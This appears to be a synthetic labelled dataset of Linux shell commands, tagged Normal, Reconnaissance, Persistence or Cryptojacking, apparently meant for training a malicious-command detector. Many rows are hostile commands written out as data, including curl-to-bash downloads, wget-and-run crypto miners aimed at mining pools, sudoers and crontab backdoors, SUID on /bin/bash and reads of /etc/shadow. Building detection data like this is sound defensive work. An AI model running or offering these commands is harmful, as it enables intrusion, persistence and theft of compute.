command,label
cat /etc/passwd,Reconnaissance
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://10.0.0.5/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmr-stak -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
ps aux | grep root,Reconnaissance
uname -a && id && w,Reconnaissance
curl -s http://bitbucket.org/miner.tar.gz | bash,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
history,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
clear,Normal
ls -la /var/log,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /var/log/syslog | grep error,Normal
top -n 1,Normal
top -n 1,Normal
netstat -tulpn,Reconnaissance
cat /proc/cpuinfo; pkill -f cpuminer; wget https://192.168.1.50/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./minerd -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
htop,Normal
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
crontab -e,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
cat /etc/shadow,Reconnaissance
top -n 1,Normal
cat /etc/shadow,Reconnaissance
cd /home/user && pwd,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /etc/shadow,Reconnaissance
ls -la /var/log,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
curl -s http://45.33.32.156/install.sh | bash,Cryptojacking
echo 'checking system logs',Normal
netstat -tulpn,Reconnaissance
ping -c 4 142.250.190.46,Normal
netstat -tulpn,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://github.com/cron.sh | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://45.33.32.156/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmrig -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/shadow,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cd /home/user && pwd,Normal
history,Normal
chmod u+s /bin/bash,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
cd /home/user && pwd,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
curl -s http://10.0.0.5/syslogd | bash,Cryptojacking
clear,Normal
chmod u+s /bin/bash,Persistence
ip a && route -n,Reconnaissance
ip a && route -n,Reconnaissance
wget http://185.12.33.1/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
cat /etc/shadow,Reconnaissance
cd /home/user && pwd,Normal
cat /etc/shadow,Reconnaissance
history,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
wget http://github.com/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o minexmr.com:443,Cryptojacking
wget http://bitbucket.org/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o minexmr.com:443,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://192.168.1.50/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
whoami,Normal
history,Normal
clear,Normal
ping -c 4 10.0.0.5,Normal
ip a && route -n,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
wget http://bitbucket.org/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o monerohash.com:3333,Cryptojacking
ls -la /var/log,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
curl -s http://192.168.1.50/miner.tar.gz | bash,Cryptojacking
ip a && route -n,Reconnaissance
nohup ./coinminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
nohup ./minerd -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ps aux | grep root,Reconnaissance
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
nohup ./kdevtmpfsi -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
ping -c 4 185.12.33.1,Normal
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
wget http://185.12.33.1/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o pool.supportxmr.com:3333,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
uname -a && id && w,Reconnaissance
netstat -tulpn,Reconnaissance
ip a && route -n,Reconnaissance
crontab -e,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
curl -s http://10.0.0.5/install.sh | bash,Cryptojacking
top -n 1,Normal
crontab -e,Persistence
cd /home/user && pwd,Normal
ps aux | grep root,Reconnaissance
ls -la /var/log,Normal
cat /etc/passwd,Reconnaissance
cat /etc/passwd,Reconnaissance
cat /etc/passwd,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
wget http://github.com/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
netstat -tulpn,Reconnaissance
history,Normal
history,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
ping -c 4 185.12.33.1,Normal
clear,Normal
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
history,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
whoami,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/shadow,Reconnaissance
ps aux | grep root,Reconnaissance
chmod u+s /bin/bash,Persistence
ip a && route -n,Reconnaissance
top -n 1,Normal
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
chmod u+s /bin/bash,Persistence
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
history,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
htop,Normal
cat /etc/passwd,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
wget http://github.com/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o xmrpool.eu:9000,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
history,Normal
ps aux | grep root,Reconnaissance
cat /etc/shadow,Reconnaissance
history,Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
uname -a && id && w,Reconnaissance
history,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cd /home/user && pwd,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /var/log/syslog | grep error,Normal
ip a && route -n,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
whoami,Normal
ps aux | grep root,Reconnaissance
ip a && route -n,Reconnaissance
ls -la /var/log,Normal
wget http://github.com/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o nanopool.org:14433,Cryptojacking
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
chmod u+s /bin/bash,Persistence
ip a && route -n,Reconnaissance
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./minerd -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ps aux | grep root,Reconnaissance
wget http://192.168.1.50/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o minexmr.com:443,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ip a && route -n,Reconnaissance
ping -c 4 github.com,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://bitbucket.org/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o nanopool.org:14433,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./cpuminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
htop,Normal
crontab -e,Persistence
top -n 1,Normal
cd /home/user && pwd,Normal
netstat -tulpn,Reconnaissance
echo 'checking system logs',Normal
crontab -e,Persistence
curl -s http://142.250.190.46/miner.tar.gz | bash,Cryptojacking
cat /var/log/syslog | grep error,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
whoami,Normal
cat /etc/passwd,Reconnaissance
cat /proc/cpuinfo; pkill -f minerd; wget https://bitbucket.org/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
cd /home/user && pwd,Normal
ping -c 4 185.12.33.1,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
wget http://142.250.190.46/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o xmrpool.eu:9000,Cryptojacking
top -n 1,Normal
chmod u+s /bin/bash,Persistence
ip a && route -n,Reconnaissance
uname -a && id && w,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
cd /home/user && pwd,Normal
nohup ./xmrig -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
cat /etc/shadow,Reconnaissance
nohup ./cpuminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
ps aux | grep root,Reconnaissance
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
netstat -tulpn,Reconnaissance
wget http://45.33.32.156/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o monerohash.com:3333,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://185.12.33.1/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
ip a && route -n,Reconnaissance
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
wget http://142.250.190.46/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o minexmr.com:443,Cryptojacking
cat /proc/cpuinfo; pkill -f minerd; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmr-stak -o minexmr.com:443' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
ip a && route -n,Reconnaissance
ps aux | grep root,Reconnaissance
chmod u+s /bin/bash,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
curl -s http://github.com/syslogd | bash,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
chmod u+s /bin/bash,Persistence
nohup ./xmr-stak -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmrig -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
wget http://142.250.190.46/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o monerohash.com:3333,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
clear,Normal
top -n 1,Normal
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ls -la /var/log,Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ps aux | grep root,Reconnaissance
ping -c 4 45.33.32.156,Normal
ps aux | grep root,Reconnaissance
whoami,Normal
top -n 1,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
history,Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://185.12.33.1/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmrig -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f xmrig; wget https://10.0.0.5/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmrig -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cd /home/user && pwd,Normal
ip a && route -n,Reconnaissance
clear,Normal
curl -s http://10.0.0.5/install.sh | bash,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ps aux | grep root,Reconnaissance
ping -c 4 192.168.1.50,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./coinminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
ip a && route -n,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
htop,Normal
cat /var/log/syslog | grep error,Normal
ip a && route -n,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
history,Normal
cat /etc/passwd,Reconnaissance
nohup ./cpuminer -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
netstat -tulpn,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
nohup ./coinminer -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
uname -a && id && w,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
netstat -tulpn,Reconnaissance
uname -a && id && w,Reconnaissance
wget http://45.33.32.156/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o xmrpool.eu:9000,Cryptojacking
chmod u+s /bin/bash,Persistence
ip a && route -n,Reconnaissance
cat /etc/shadow,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ps aux | grep root,Reconnaissance
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
cat /etc/shadow,Reconnaissance
htop,Normal
echo 'checking system logs',Normal
wget http://10.0.0.5/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o minexmr.com:443,Cryptojacking
nohup ./kdevtmpfsi -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
crontab -e,Persistence
wget http://185.12.33.1/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o monerohash.com:3333,Cryptojacking
crontab -e,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
curl -s http://192.168.1.50/syslogd | bash,Cryptojacking
ping -c 4 45.33.32.156,Normal
crontab -e,Persistence
echo 'checking system logs',Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://185.12.33.1/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
nohup ./kdevtmpfsi -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
crontab -e,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
echo 'checking system logs',Normal
